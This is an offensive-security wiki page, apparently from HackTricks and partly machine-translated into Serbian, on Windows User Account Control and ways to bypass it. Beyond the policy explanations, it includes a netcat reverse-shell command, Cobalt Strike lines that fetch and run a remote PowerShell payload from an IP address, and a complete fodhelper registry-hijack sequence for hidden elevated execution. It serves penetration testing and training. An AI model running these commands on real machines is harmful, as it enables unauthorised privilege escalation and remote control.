# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a **consent prompt for elevated activities**. Applications have different `integrity` levels, and a program with a **high level** can perform tasks that **could potentially compromise the system**. When UAC is enabled, applications and tasks always **run under the security context of a non-administrator account** unless an administrator explicitly authorizes these applications/tasks to have administrator-level access to the system to run. It is a convenience feature that protects administrators from unintended changes but is not considered a security boundary.

For more info about integrity levels:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Kada je UAC aktivan, administratorskom korisniku se dodeljuju 2 tokena: standardni token korisnika za obavljanje uobičajenih radnji na regularnom nivou, i token sa administratorskim privilegijama.

Ova [stranica](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) detaljno objašnjava kako UAC funkcioniše i uključuje proces logovanja, korisničko iskustvo i UAC arhitekturu. Administratori mogu koristiti sigurnosne politike da konfigurišu kako UAC radi specifično za njihovu organizaciju na lokalnom nivou (korišćenjem secpol.msc), ili da ih konfigurišu i distribuiraju putem Group Policy Objects (GPO) u Active Directory domen okruženju. Različita podešavanja su detaljno objašnjena [here](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Postoji 10 Group Policy podešavanja koja se mogu postaviti za UAC. Sledeća tabela pruža dodatne detalje:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Onemogućeno                                                 |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Onemogućeno                                                 |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Zatraži pristanak za non-Windows binarne fajlove           |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Zatraži kredencijale na sigurnom desktopu                  |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Omogućeno (default for home) Onemogućeno (default for enterprise) |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Onemogućeno                                                 |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Omogućeno                                                    |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Omogućeno                                                    |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Omogućeno                                                    |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Omogućeno                                                    |

### UAC Bypass Theory

Neki programi se automatski podižu na viši nivo privilegija ("autoelevated") ako korisnik pripada administratorskoj grupi. Ti binarni fajlovi u svom _**Manifests**_ sadrže opciju _**autoElevate**_ sa vrednošću _**True**_. Binarni fajl takođe mora biti **potpisan od strane Microsoft-a**.

Mnogi auto-elevate procesi izlažu **funkcionalnost preko COM objekata ili RPC servera**, koji se mogu pozvati iz procesa koji rade sa medium integritetom (privilegije običnog korisnika). Napomena: COM (Component Object Model) i RPC (Remote Procedure Call) su metode koje Windows programi koriste za komunikaciju i izvršavanje funkcija između različitih procesa. Na primer, **`IFileOperation COM object`** je dizajniran za rukovanje operacijama nad fajlovima (kopiranje, brisanje, pomeranje) i može automatski podići privilegije bez prikaza upita.

Takođe, neke provere mogu biti izvršene, na primer proveravanje da li je proces pokrenut iz **System32 directory**, što se može zaobići, na primer, **injecting into explorer.exe** ili druge izvršne datoteke locirane u System32.

Drugi način za zaobilaženje ovih provera je izmena **PEB**. Svaki proces u Windows-u ima Process Environment Block (PEB), koji uključuje važne podatke o procesu, kao što je putanja do izvršne datoteke. Izmenom PEB-a, napadači mogu falsifikovati (spoofovati) lokaciju svog malicioznog procesa, čineći da izgleda kao da se pokreće iz pouzdanog direktorijuma (npr. system32). Ove lažne informacije prevare COM objekat da automatski podigne privilegije bez prikazivanja upita korisniku.

Zatim, da bi **zaobišli** **UAC** (podižući sa **medium** nivoa integriteta **na high**), neki napadači koriste ovakve binarne fajlove da bi **izvršili proizvoljan kod**, jer će on biti izvršen iz procesa sa **High** nivoom integriteta.

Možete proveriti _**Manifest**_ binarnog fajla koristeći alat _**sigcheck.exe**_ iz Sysinternals. (`sigcheck.exe -m <file>`) I možete videti **nivo integriteta** procesa koristeći _Process Explorer_ ili _Process Monitor_ (iz Sysinternals).

### Check UAC

Da biste potvrdili da li je UAC omogućen uradite:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
Ako je **`1`** onda je UAC **aktiviran**, ako je **`0`** ili ne postoji, UAC je **neaktivan**.

Zatim proverite **koji nivo** je konfigurisan:
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)  
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)  
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)  
- If **`3`** like `1` but not necessary on Secure Desktop  
- If **`4`** like `2` but not necessary on Secure Desktop  
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

Zatim, treba da pogledate vrednost **`LocalAccountTokenFilterPolicy`**\
Ako je vrednost **`0`**, onda samo korisnik **RID 500** (**built-in Administrator**) može da izvršava **admin zadatke bez UAC**, a ako je `1`, **svi nalozi u grupi "Administrators"** mogu to da rade.

I, na kraju, pogledajte vrednost ključa **`FilterAdministratorToken`**\
Ako je **`0`** (default), **built-in Administrator account može** da obavlja zadatke udaljene administracije, a ako je **`1`** built-in Administrator nalog **ne može** da obavlja udaljenu administraciju, osim ako `LocalAccountTokenFilterPolicy` nije postavljen na `1`.

#### Sažetak

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC bypass

> [!TIP]
> Imajte na umu da ako imate grafički pristup žrtvi, UAC bypass je jednostavan jer možete jednostavno kliknuti na "Da" kada se pojavi UAC prompt

The UAC bypass is needed in the following situation: **UAC je aktiviran, vaš proces radi u kontekstu srednjeg nivoa integriteta, i vaš nalog pripada grupi administratora**.

Važno je napomenuti da je **mnogo teže zaobići UAC ako je na najvišem nivou bezbednosti (Always) nego ako je na nekom od ostalih nivoa (Default).**

### UAC disabled

If UAC is already disabled (`ConsentPromptBehaviorAdmin` is **`0`**) you can **execute a reverse shell with admin privileges** (high integrity level) using something like:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Vrlo** osnovni UAC "bypass" (potpun pristup fajl sistemu)

Ako imate shell sa korisnikom koji je u grupi Administrators, možete **mount-ovati C$ share preko SMB-a** lokalno kao novi disk i imaćete **pristup svemu u fajl sistemu** (čak i Administratorovom korisničkom direktorijumu).

> [!WARNING]
> **Izgleda da ovaj trik više ne radi**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass sa cobalt strike

Tehnike Cobalt Strike rade samo ako UAC nije podešen na maksimalni nivo bezbednosti.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** i **Metasploit** takođe imaju nekoliko modula za **bypass** **UAC**.

### KRBUACBypass

Dokumentacija i alat na [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) koji je **kompilacija** nekoliko UAC bypass exploits. Imajte na umu da ćete morati **kompajlirati UACME koristeći visual studio ili msbuild**. Kompilacija će kreirati nekoliko izvršnih fajlova (npr. `Source\Akagi\outout\x64\Debug\Akagi.exe`), moraćete da znate **koji vam je potreban.**\
Trebalo bi da budete **pažljivi** jer će neki bypass-i **pokrenuti neke druge programe** koji će **obavestiti** **korisnika** da se nešto dešava.

UACME sadrži **build verziju od koje je svaka tehnika počela da radi**. Možete pretražiti tehniku koja utiče na vaše verzije:
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Takođe, koristeći [this](https://en.wikipedia.org/wiki/Windows_10_version_history) stranicu dobijate Windows izdanje `1607` iz verzija build-a.

### UAC Bypass – fodhelper.exe (Registry hijack)

Pouzdani binarni fajl `fodhelper.exe` se automatski povišava na modernim Windows sistemima. Kada se pokrene, upituje per-user registry putanju ispod bez validacije `DelegateExecute` verbe. Postavljanje komande tamo omogućava procesu sa Medium Integrity (korisnik je u Administrators) da pokrene proces sa High Integrity bez UAC prompta.

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell koraci (postavite svoj payload, zatim pokrenite):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Beleške:
- Radi kada je trenutni korisnik član grupe Administrators i UAC nivo je podrazumevan/opušten (ne Always Notify sa dodatnim ograničenjima).
- Koristite putanju `sysnative` da pokrenete 64-bit PowerShell iz 32-bit procesa na 64-bit Windowsu.
- Payload može biti bilo koja komanda (PowerShell, cmd, or an EXE path). Izbegavajte UI koji zahtevaju potvrdu radi prikrivenosti.

#### More UAC bypass

**All** the techniques used here to bypass UAC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ bi trebalo da radi)

### UAC Bypass with GUI

Ako imate pristup **GUI, jednostavno možete prihvatiti UAC prompt** kada se pojavi — zaista vam tada nije potreban bypass. Dakle, dobijanje pristupa GUI omogućava zaobilaženje UAC.

Štaviše, ako dobijete GUI sesiju koju je neko koristio (potencijalno preko RDP), postoje **neki alati koji će se pokretati kao administrator** iz kojih biste, na primer, mogli **pokrenuti** **cmd** **as admin** direktno bez ponovnog UAC prompta, kao [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Ovo može biti malo **stealthy**.

### Noisy brute-force UAC bypass

Ako vam ne smeta buka, uvek možete **pokrenuti nešto kao** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) koje **traži elevaciju privilegija sve dok korisnik to ne prihvati**.

### Your own bypass - Basic UAC bypass methodology

Ako pogledate **UACME** primetićete da **većina UAC bypass-ova zloupotrebljava Dll Hijacking vulnerabilit**y (uglavnom upisujući maliciozni dll u _C:\Windows\System32_). [Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Pronađite binarni fajl koji će **autoelevate** (proverite da pri izvršenju radi u visokom integritetskom nivou).
2. Pomoću procmon pronađite događaje "**NAME NOT FOUND**" koji mogu biti ranjivi na **DLL Hijacking**.
3. Verovatno ćete morati da **upisete** DLL u neke **zaštićene putanje** (kao C:\Windows\System32) gde nemate dozvolu za pisanje. Ovo možete zaobići koristeći:
   1. **wusa.exe**: Windows 7, 8 i 8.1. Omogućava ekstrakciju sadržaja CAB fajla u zaštićene putanje (jer se ovaj alat izvršava u visokom integritetskom nivou).
   2. **IFileOperation**: Windows 10.
4. Pripremite **script** koji će kopirati vaš DLL u zaštićenu putanju i pokrenuti ranjivi i autoelevated binarni fajl.

### Another UAC bypass technique

Sastoji se u proveri da li neki **autoElevated binary** pokušava da **read** iz **registry** **name/path** nekog **binary** ili **command** koji će biti **executed** (ovo je interesantnije ako binary traži ovu informaciju u okviru **HKCU**).

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
